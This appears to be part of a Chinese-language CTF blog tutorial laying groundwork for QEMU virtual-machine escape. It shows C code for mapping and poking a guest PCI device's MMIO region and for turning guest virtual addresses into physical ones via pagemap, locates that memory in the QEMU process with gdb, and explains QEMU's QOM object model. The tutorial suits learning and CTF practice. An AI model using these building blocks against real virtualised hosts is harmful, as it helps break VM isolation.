c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//或者void * mmio    = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open(&quot;/dev/mem&quot;,2),0xfea00000);</span></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"><span class="comment">//读写实例</span></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Qemu内存地址转换"><a href="#Qemu内存地址转换" class="headerlink" title="Qemu内存地址转换"></a>Qemu内存地址转换</h1><p>先贴一个经典的图,虽然不知道为什么要贴这张图,但是很多介绍QEMU的文章中都用到了这张图,贴就对了(bushi)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>我们知道，在我们的物理机上面进程的虚拟地址必须通过转换才能变为物理地址，被CPU所处理。而QEMU上运行的内核上运行的用户态程序的虚拟地址也需要转换才能变成相应的物理地址，而这个物理地址对应的是在我们宿主机上运行的QEMU的虚拟地址(有点绕，结合上面这个图大概可以明白)</p><p><code>Guest&#39; processes</code>的虚拟地址经过页表转换变成<code>Guest&#39; processes</code>的物理地址，而这个<code>Guest&#39; processes</code>的物理地址实际上对应着QEMU进程的一块虚拟地址</p><p>那么我们如何从<code>Guest&#39; processes</code>的虚拟地址来找到它的物理地址，进而找到对应的QEMU虚拟地址区域呢</p><p>我们可以通过下列程序来查看,先通过调试来验证，然后再说明原理(这里用的是后面例题<code>HITB-GSEC-2017-babyqemu</code>的QEMU、内核以及文件系统)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将其编译、文件系统重打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">photon@Photon:/mnt/d/<span class="built_in">test</span>/pwn/qemu_escape/babyqemu/core$ gcc gva2gpa.c -static -o gva2tpa</span><br><span class="line">photon@Photon:/mnt/d/<span class="built_in">test</span>/pwn/qemu_escape/babyqemu/core$ find . | cpio -H newc -o &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure><p>当然也可以通过SCP的形式传进QEMU，但不知道为什么在这个例子中没有成功，所以就用了调试内核常用的方法</p><p>需要注意的是我们调试的是QEMU而不是内核，所以与调试Kernel题的时候在QEMU选项上面加上<code>-S -s</code>然后gdb里面<code>target remote:1234</code>不一样，这里我们将选项写入某个文件(cmd)中</p><p>然后利用</p><p><img src="https://s2.loli.net/2023/05/10/NbDF8dJ56nKVYfZ.png" alt="image-20230510190237201"></p><p>即可</p><p>或者直接运行<code>lauch.sh</code>,然后再起一个终端用gdb attach把qemu进程给attach上即可(感觉后面方便一点？这里用了后者)</p><p><img src="https://s2.loli.net/2023/05/10/iv6APDloFnMwmHO.png" alt="image-20230510190903415"></p><p>这里有个大小为<code>0x4000000</code>(起始地址为 <code>0x7f7473600000</code>)的就是我们<code>Guest’s Process</code>映射的QEMU虚拟地址部分(因为qemu虚拟机对应的内存为1G)</p><p>所以我们直接加上得到的偏移<code>0x3a42b20</code>即可获取我们写入字符串对应QEMU进程的位置</p><p><img src="https://s2.loli.net/2023/08/09/YZ9gXjfMebqBDUw.png" alt="image-20230510191046153"></p><p>那么话说回来，这样转换的原理是什么？其实原理很简单，内核为我们提供了一个叫做pagemap的接口，比如这里我们打开的<code>/proc/self/pagemap</code>，他会为没饿过page生成一个64位的描述符，描述虚拟地址这一页对应的物理帧号或者SWAP里面的偏移</p><p>可以细致分析一下主要代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是<code>gva_to_gfn</code>，把从虚拟地址找到帧号。<code>/proc/self/pagemap</code>相当于一个表，其表项大小为8字节，所以假设我们序号为n，则通过偏移8*n(也就是n&lt;<3)即可找到对应表项。而这里的序号也即是我们虚拟地址与页大小MASK之后的高位(如果不懂得话这里可以去了解一下页表转换的过程，根据页表级数的不同可能会有多级页目录表、页表之类的)。由于页大小为1<<12,所以最后偏移就是` (addr >&gt;12)&lt;<3`,修改一下即是`(addr>&gt;9 ) &amp;~7`(右移12位然后再左移3位相当于右移9位，然后低3位置零。其实我感觉这样写很奇怪)</p><p>找到偏移之后通过<code>lseek</code>与<code>read</code>操作找到表项，进行&amp;PFN_PFN之后与业内偏移拼接一下即可得到物理地址。其上述过程可以修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实简而言之就是个查表找到高位然后和偏移拼接的过程，甚至不需要多级页表(因为<code>/proc/self/pagemap</code>接口帮你搞好了)</p><h1 id="QOM-Qemu-Object-Module-模型"><a href="#QOM-Qemu-Object-Module-模型" class="headerlink" title="QOM(Qemu Object Module)模型"></a>QOM(Qemu Object Module)模型</h1><p>QOM是QEMU提供的一套面向对象编程模型(虽然QEMU是用C来写的，但是利用QOM我们也能进行面向对象的一些操作)，用来实现一些设备</p><p>我们可以通过这个模型，来自己编写QEMU中的设备，它主要由四个组件构成</p><ul><li><code>Type</code> 定义一个类</li><li><code>Class</code> 存储类静态数据和函数指针</li><li><code>Object</code> 存储动态数据，动态分配一个类的实例</li><li><code>Property</code> 动态对象数据的访问器</li></ul><h2 id="TypeInfo"><a href="#TypeInfo" class="headerlink" title="TypeInfo"></a>TypeInfo</h2><p><code>TypeInfo</code>是用户来定义一个<code>Type</code>的结构体，我们定义了一个<code>TypeInfo</code>之后，调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就能生成一个<code>TypeImpl</code>实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include/qom/object.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//类型名</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent; <span class="comment">//父类型名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> instance_size; <span class="comment">//对象大小(Class)</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj); <span class="comment">//相当于构造函数，用以初始化对象。和C++类似，调用前父类已经被初始化，所以子类只需要初始化自己的成员变量</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj); <span class="comment">//在所有的instance_init函数被调用之后，该函数被调用来结束一个对象的初始化</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);<span class="comment">//相当于析构函数。和C++的析构顺序一样，在父类的析构函数前调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> abstract;<span class="comment">//标识虚类。若为真则为虚类，无法被直接实例化</span></span><br><span class="line">    <span class="keyword">size_t</span> class_size; <span class="comment">//这个对象的类对象大小(和instance_size有什么区别？)</span></span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data); <span class="comment">//该函数在所有父类初始化结束后被调用，让一个类设置它的默认虚方法指针，也能重写父类的虚方法</span></span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data); <span class="comment">//在所有的父类被初始化之后，但是类自身初始化之前，为所有的基类调用改函数</span></span><br><span class="line">    <span class="keyword">void</span> *class_data;<span class="comment">//传递给class init和class_base_init的数据</span></span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;<span class="comment">//这个类型相关的接口，指向一个以0元素结尾的静态数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们想定义一个类的时候，我们需要定义一个<code>TypeInfo</code>类型的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo Test_type_info</span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">staic <span class="keyword">void</span> Test_register_types(<span class="keyword">void</span>) <span class="comment">//注册</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;Test_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p>我们可以通过<code>Class</code>结构体来定义类的静态内容，比如静态成员，函数表之类的，它应当继承自某个Class类型</p><p><code>ObjectClass</code>是所有类的基类</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Type type;</span><br><span class="line">GSList *interfaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable* properties;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有的qemu总线，设备等的<code>type_register_static</code>执行完成之后(也就是他们的<code>TypeImpl</code>实例被创建成功之后)，qemu会在<code>type_initialize</code>函数中去实例化对应的<code>ObjectClasses</code></p><p>比如我们可以定义一个<code>Test</code>的Class</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ObjectClass parent;</span><br><span class="line">...<span class="comment">//可以添加其他的成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类的定义中父类都在第一个字段，让父类和子类可以直接转换。类初始化时会先初始化它的父类</p><p>这样定义之后，我们也需要在之前的类定义那里去修改一下与<code>Class</code>相关的构造函数等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">test_class_init</span><span class="params">(ObjectClass *klass,<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo test_type_info = </span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(TestClass),</span><br><span class="line">    .class_init = test_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><code>Object</code>类型用来表示类的一个实例对象。刚刚所说的<code>TypeInfo</code>以及<code>ObjectClass</code>只是定义的类型，而非具体的设备，我们之前所介绍的<code>TypeInfo</code>结构体中的有两个函数指针<code>instance_init</code>以及<code>class_init</code>，前者负责初始化具体<code>Object</code>结构体,而后者负责初始化<code>ObjectClass</code>结构体</p><p>这个类型我们同样需要定义，其继承自某个<code>Object</code></p><p>同<code>ObjectClass</code>类似，所有<code>Object</code>结构体类型的基类都是<code>Object</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span 